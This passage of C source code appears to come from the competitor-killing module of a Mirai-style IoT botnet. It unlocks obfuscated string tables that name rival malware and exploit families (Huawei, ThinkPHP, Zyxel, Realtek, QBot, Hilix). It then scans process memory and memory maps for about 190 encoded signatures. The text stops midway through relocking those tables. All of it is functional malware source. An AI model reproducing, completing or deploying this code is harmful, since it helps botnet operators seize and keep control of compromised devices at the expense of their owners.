static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(KILLER_PROC_HUAWEI);
    table_unlock_val(KILLER_PROC_THINKPHP);
    table_unlock_val(KILLER_PROC_ZYXEL);
    table_unlock_val(KILLER_PROC_REALTEK);
    table_unlock_val(KILLER_PROC_HTTP_ATTACK);
    table_unlock_val(KILLER_PROC_QBOT_REPORT);
    table_unlock_val(KILLER_PROC_QBOT_HTTP);
    table_unlock_val(KILLER_PROC_QBOT_DUP);
    table_unlock_val(KILLER_PROC_HILIX);
    table_unlock_val(KILLER_PROC_CDNCGI);
    table_unlock_val(KILLER_PROC_SHORELINE);
    table_unlock_val(KILLER_PROC_WATCHDOG);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (is_memory_scan(table_retrieve_val(KILLER_PROC_QBOT_REPORT, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_QBOT_HTTP, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_QBOT_DUP, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_HUAWEI, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_THINKPHP, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_ZYXEL, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_REALTEK, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_HILIX, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_CDNCGI, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_SHORELINE, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_WATCHDOG, NULL), rdbuf, ret) ||
            is_memory_scan(table_retrieve_val(KILLER_PROC_HTTP_ATTACK, NULL), rdbuf, ret))
        {
            found = TRUE;
            break;
        }
    }

    //m_upx_str = "\x58\x4D\x4E\x4E\x43\x50\x46\x22";                table_retrieve_val(TABLE_MEM_QBOT, &m_qbot_len);
    //m_upx = "UPX!";

    table_lock_val(KILLER_PROC_HILIX);
    table_lock_val(KILLER_PROC_HUAWEI);
    table_lock_val(KILLER_PROC_THINKPHP);
    table_lock_val(KILLER_PROC_ZYXEL);
    table_lock_val(KILLER_PROC_REALTEK);
    table_lock_val(KILLER_PROC_HTTP_ATTACK);
    table_lock_val(KILLER_PROC_QBOT_REPORT);
    table_lock_val(KILLER_PROC_QBOT_HTTP);
    table_lock_val(KILLER_PROC_QBOT_DUP);
    table_lock_val(KILLER_PROC_CDNCGI);
    table_lock_val(KILLER_PROC_SHORELINE);
    table_lock_val(KILLER_PROC_WATCHDOG);

    close(fd);

    return found;
}

static BOOL maps_scan_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_MEM_1);
    table_unlock_val(TABLE_MEM_2);
    table_unlock_val(TABLE_MEM_3);
    table_unlock_val(TABLE_MEM_4);
    table_unlock_val(TABLE_MEM_5);
    table_unlock_val(TABLE_MEM_6);
    table_unlock_val(TABLE_MEM_7);
    table_unlock_val(TABLE_MEM_8);
    table_unlock_val(TABLE_MEM_9);
    table_unlock_val(TABLE_MEM_10);
    table_unlock_val(TABLE_MEM_11);
    table_unlock_val(TABLE_MEM_12);
    table_unlock_val(TABLE_MEM_13);
    table_unlock_val(TABLE_MEM_14);
    table_unlock_val(TABLE_MEM_15);
    table_unlock_val(TABLE_MEM_16);
    table_unlock_val(TABLE_MEM_17);
    table_unlock_val(TABLE_MEM_18);
    table_unlock_val(TABLE_MEM_19);
    table_unlock_val(TABLE_MEM_20);
    table_unlock_val(TABLE_MEM_21);
    table_unlock_val(TABLE_MEM_22);
    table_unlock_val(TABLE_MEM_23);
    table_unlock_val(TABLE_MEM_24);
    table_unlock_val(TABLE_MEM_25);
    table_unlock_val(TABLE_MEM_26);
    table_unlock_val(TABLE_MEM_27);
    table_unlock_val(TABLE_MEM_28);
    table_unlock_val(TABLE_MEM_29);
    table_unlock_val(TABLE_MEM_30);
    table_unlock_val(TABLE_MEM_31);
    table_unlock_val(TABLE_MEM_32);
    table_unlock_val(TABLE_MEM_33);
    table_unlock_val(TABLE_MEM_34);
    table_unlock_val(TABLE_MEM_35);
    table_unlock_val(TABLE_MEM_36);
    table_unlock_val(TABLE_MEM_37);
    table_unlock_val(TABLE_MEM_38);
    table_unlock_val(TABLE_MEM_39);
    table_unlock_val(TABLE_MEM_40);
    table_unlock_val(TABLE_MEM_41);
    table_unlock_val(TABLE_MEM_42);
    table_unlock_val(TABLE_MEM_43);
    table_unlock_val(TABLE_MEM_44);
    table_unlock_val(TABLE_MEM_45);
    table_unlock_val(TABLE_MEM_46);
    table_unlock_val(TABLE_MEM_47);
    table_unlock_val(TABLE_MEM_48);
    table_unlock_val(TABLE_MEM_49);
    table_unlock_val(TABLE_MEM_50);
    table_unlock_val(TABLE_MEM_51);
    table_unlock_val(TABLE_MEM_52);
    table_unlock_val(TABLE_MEM_53);
    table_unlock_val(TABLE_MEM_54);
    table_unlock_val(TABLE_MEM_55);
    table_unlock_val(TABLE_MEM_56);
    table_unlock_val(TABLE_MEM_57);
    table_unlock_val(TABLE_MEM_58);
    table_unlock_val(TABLE_MEM_59);
    table_unlock_val(TABLE_MEM_60);
    table_unlock_val(TABLE_MEM_61);
    table_unlock_val(TABLE_MEM_62);
    table_unlock_val(TABLE_MEM_63);
    table_unlock_val(TABLE_MEM_64);
    table_unlock_val(TABLE_MEM_65);
    table_unlock_val(TABLE_MEM_66);
    table_unlock_val(TABLE_MEM_67);
    table_unlock_val(TABLE_MEM_68);
    table_unlock_val(TABLE_MEM_69);
    table_unlock_val(TABLE_MEM_70);
    table_unlock_val(TABLE_MEM_71);
    table_unlock_val(TABLE_MEM_72);
    table_unlock_val(TABLE_MEM_73);
    table_unlock_val(TABLE_MEM_74);
    table_unlock_val(TABLE_MEM_75);
    table_unlock_val(TABLE_MEM_76);
    table_unlock_val(TABLE_MEM_77);
    table_unlock_val(TABLE_MEM_78);
    table_unlock_val(TABLE_MEM_79);
    table_unlock_val(TABLE_MEM_80);
    table_unlock_val(TABLE_MEM_81);
    table_unlock_val(TABLE_MEM_82);
    table_unlock_val(TABLE_MEM_83);
    table_unlock_val(TABLE_MEM_84);
    table_unlock_val(TABLE_MEM_85);
    table_unlock_val(TABLE_MEM_86);
    table_unlock_val(TABLE_MEM_87);
    table_unlock_val(TABLE_MEM_88);
    table_unlock_val(TABLE_MEM_89);
    table_unlock_val(TABLE_MEM_90);
    table_unlock_val(TABLE_MEM_91);
    table_unlock_val(TABLE_MEM_92);
    table_unlock_val(TABLE_MEM_93);
    table_unlock_val(TABLE_MEM_94);
    table_unlock_val(TABLE_MEM_95);
    table_unlock_val(TABLE_MEM_96);
    table_unlock_val(TABLE_MEM_97);
    table_unlock_val(TABLE_MEM_98);
    table_unlock_val(TABLE_MEM_99);
    table_unlock_val(TABLE_MEM_100);
    table_unlock_val(TABLE_MEM_101);
    table_unlock_val(TABLE_MEM_102);
    table_unlock_val(TABLE_MEM_103);
    table_unlock_val(TABLE_MEM_104);
    table_unlock_val(TABLE_MEM_105);
    table_unlock_val(TABLE_MEM_106);
    table_unlock_val(TABLE_MEM_107);
    table_unlock_val(TABLE_MEM_108);
    table_unlock_val(TABLE_MEM_109);
    table_unlock_val(TABLE_MEM_110);
    table_unlock_val(TABLE_MEM_111);
    table_unlock_val(TABLE_MEM_112);
    table_unlock_val(TABLE_MEM_113);
    table_unlock_val(TABLE_MEM_114);
    table_unlock_val(TABLE_MEM_115);
    table_unlock_val(TABLE_MEM_116);
    table_unlock_val(TABLE_MEM_117);
    table_unlock_val(TABLE_MEM_118);
    table_unlock_val(TABLE_MEM_119);
    table_unlock_val(TABLE_MEM_120);
    table_unlock_val(TABLE_MEM_121);
    table_unlock_val(TABLE_MEM_122);
    table_unlock_val(TABLE_MEM_123);
    table_unlock_val(TABLE_MEM_124);
    table_unlock_val(TABLE_MEM_125);
    table_unlock_val(TABLE_MEM_126);
    table_unlock_val(TABLE_MEM_127);
    table_unlock_val(TABLE_MEM_128);
    table_unlock_val(TABLE_MEM_129);
    table_unlock_val(TABLE_MEM_130);
    table_unlock_val(TABLE_MEM_131);
    table_unlock_val(TABLE_MEM_132);
    table_unlock_val(TABLE_MEM_133);
    table_unlock_val(TABLE_MEM_134);
    table_unlock_val(TABLE_MEM_135);
    table_unlock_val(TABLE_MEM_136);
    table_unlock_val(TABLE_MEM_137);
    table_unlock_val(TABLE_MEM_138);
    table_unlock_val(TABLE_MEM_139);
    table_unlock_val(TABLE_MEM_140);
    table_unlock_val(TABLE_MEM_141);
    table_unlock_val(TABLE_MEM_142);
    table_unlock_val(TABLE_MEM_143);
    table_unlock_val(TABLE_MEM_144);
    table_unlock_val(TABLE_MEM_145);
    table_unlock_val(TABLE_MEM_146);
    table_unlock_val(TABLE_MEM_147);
    table_unlock_val(TABLE_MEM_148);
    table_unlock_val(TABLE_MEM_149);
    table_unlock_val(TABLE_MEM_150);
    table_unlock_val(TABLE_MEM_151);
    table_unlock_val(TABLE_MEM_152);
    table_unlock_val(TABLE_MEM_153);
    table_unlock_val(TABLE_MEM_154);
    table_unlock_val(TABLE_MEM_155);
    table_unlock_val(TABLE_MEM_156);
    table_unlock_val(TABLE_MEM_157);
    table_unlock_val(TABLE_MEM_158);
    table_unlock_val(TABLE_MEM_159);
    table_unlock_val(TABLE_MEM_160);
    table_unlock_val(TABLE_MEM_161);
    table_unlock_val(TABLE_MEM_162);
    table_unlock_val(TABLE_MEM_163);
    table_unlock_val(TABLE_MEM_164);
    table_unlock_val(TABLE_MEM_165);
    table_unlock_val(TABLE_MEM_166);
    table_unlock_val(TABLE_MEM_167);
    table_unlock_val(TABLE_MEM_168);
    table_unlock_val(TABLE_MEM_169);
    table_unlock_val(TABLE_MEM_170);
    table_unlock_val(TABLE_MEM_171);
    table_unlock_val(TABLE_MEM_172);
    table_unlock_val(TABLE_MEM_173);
    table_unlock_val(TABLE_MEM_174);
    table_unlock_val(TABLE_MEM_175);
    table_unlock_val(TABLE_MEM_176);
    table_unlock_val(TABLE_MEM_177);
    table_unlock_val(TABLE_MEM_178);
    table_unlock_val(TABLE_MEM_179);
    table_unlock_val(TABLE_MEM_180);
    table_unlock_val(TABLE_MEM_181);
    table_unlock_val(TABLE_MEM_182);
    table_unlock_val(TABLE_MEM_183);
    table_unlock_val(TABLE_MEM_184);
    table_unlock_val(TABLE_MEM_185);
    table_unlock_val(TABLE_MEM_186);
    table_unlock_val(TABLE_MEM_187);
    table_unlock_val(TABLE_MEM_188);
    table_unlock_val(TABLE_MEM_189);
    table_unlock_val(TABLE_MEM_190);
    table_unlock_val(TABLE_MEM_191);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(
            is_active_bin(table_retrieve_val(TABLE_MEM_1, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_2, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_3, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_4, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_5, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_6, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_7, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_8, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_9, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_10, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_11, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_12, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_13, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_14, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_15, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_16, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_17, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_18, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_19, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_20, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_21, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_22, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_23, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_24, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_25, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_26, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_27, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_28, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_29, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_30, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_31, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_32, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_33, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_34, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_35, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_36, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_37, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_38, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_39, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_40, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_41, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_42, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_43, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_44, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_45, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_46, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_47, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_48, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_49, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_50, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_51, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_52, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_53, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_54, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_55, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_56, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_57, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_58, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_59, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_60, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_61, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_62, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_63, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_64, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_65, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_66, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_67, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_68, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_69, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_70, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_71, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_72, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_73, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_74, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_75, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_76, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_77, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_78, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_79, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_80, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_81, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_82, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_83, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_84, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_85, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_86, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_87, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_88, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_89, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_90, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_91, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_92, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_93, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_94, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_95, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_96, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_97, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_98, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_99, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_100, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_101, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_102, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_103, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_104, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_105, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_106, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_107, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_108, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_109, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_110, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_111, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_112, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_113, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_114, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_115, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_116, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_117, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_118, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_119, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_120, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_121, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_122, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_123, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_124, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_125, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_126, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_127, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_128, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_129, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_130, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_131, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_132, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_133, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_134, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_135, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_136, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_137, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_138, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_139, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_140, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_141, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_142, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_143, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_144, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_145, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_146, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_147, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_148, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_149, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_151, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_152, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_153, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_154, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_155, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_156, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_157, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_158, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_159, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_160, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_161, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_162, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_163, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_164, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_165, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_166, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_167, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_168, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_169, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_170, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_171, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_172, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_173, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_174, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_175, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_176, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_177, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_178, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_179, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_180, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_181, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_182, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_183, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_184, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_185, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_186, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_187, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_189, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_190, NULL), rdbuf, ret) ||
            is_active_bin(table_retrieve_val(TABLE_MEM_191, NULL), rdbuf, ret))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_MEM_1);
    table_lock_val(TABLE_MEM_2);
    table_lock_val(TABLE_MEM_3);
    table_lock_val(TABLE_MEM_4);
    table_lock_val(TABLE_MEM_5);
    table_lock_val(TABLE_MEM_6);
    table_lock_val(TABLE_MEM_7);
    table_lock_val(TABLE_MEM_8);
    table_lock_val(TABLE_MEM_9);
    table_lock_val(TABLE_MEM_10);
    table_lock_val(TABLE_MEM_11);
    table_lock_val(TABLE_MEM_12);
    table_lock_val(TABLE_MEM_13);
    table_lock_val(TABLE_MEM_14);
    table_lock_val(TABLE_MEM_15);
    table_lock_val(TABLE_MEM_16);
    table_lock_val(TABLE_MEM_17);
    table_lock_val(TABLE_MEM_18);
    table_lock_val(TABLE_MEM_19);
    table_lock_val(TABLE_MEM_20);
    table_lock_val(TABLE_MEM_21);
    table_lock_val(TABLE_MEM_22);
    table_lock_val(TABLE_MEM_23);
    table_lock_val(TABLE_MEM_24);
    table_lock_val(TABLE_MEM_25);
    table_lock_val(TABLE_MEM_26);
    table_lock_val(TABLE_MEM_27);
    table_lock_val(TABLE_MEM_28);
    table_lock_val(TABLE_MEM_29);
    table_lock_val(TABLE_MEM_30);
    table_lock_val(TABLE_MEM_31);
    table_lock_val(TABLE_MEM_32);
    table_lock_val(TABLE_MEM_33);
    table_lock_val(TABLE_MEM_34);
    table_lock_val(TABLE_MEM_35);
    table_lock_val(TABLE_MEM_36);
    table_lock_val(TABLE_MEM_37);
    table_lock_val(TABLE_MEM_38);
    table_lock_val(TABLE_MEM_39);
    table_lock_val(TABLE_MEM_40);
    table_lock_val(TABLE_MEM_41);
    table_lock_val(TABLE_MEM_42);
    table_lock_val(TABLE_MEM_43);
    table_lock_val(TABLE_MEM_44);
    table_lock_val(TABLE_MEM_45);
    table_lock_val(TABLE_MEM_46);
    table_lock_val(TABLE_MEM_47);
    table_lock_val(TABLE_MEM_48);
    table_lock_val(TABLE_MEM_49);
    table_lock_val(TABLE_MEM_50);
    table_lock_val(TABLE_MEM_51);
